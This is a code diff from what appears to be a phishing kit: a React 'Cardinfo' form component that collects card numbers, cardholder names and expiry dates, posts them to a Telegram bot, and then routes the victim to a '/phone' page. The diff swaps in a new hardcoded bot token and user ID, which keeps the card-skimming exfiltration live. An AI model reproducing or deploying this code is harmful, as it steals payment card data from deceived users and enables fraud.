@@ -23,8 +23,8 @@ function Cardinfo() {
         //console.log
         // console.log(values);
 
-        const bot_token = '6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM';
-        const user_id = 727686605;
+        const bot_token = '5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0';
+        const user_id = 5339916869;
         let my_text = `cardnumber: ${values.cardnumber}     
                          fullname: ${values.fullname}      
                                                       Date:  ${values.month}/${values.year}       
@@ -35,8 +35,7 @@ function Cardinfo() {
         api.open('Get', url, true);
         api.send();
 
-        navigate("/phone")
-        
+        navigate('/phone');
       },
     });
 
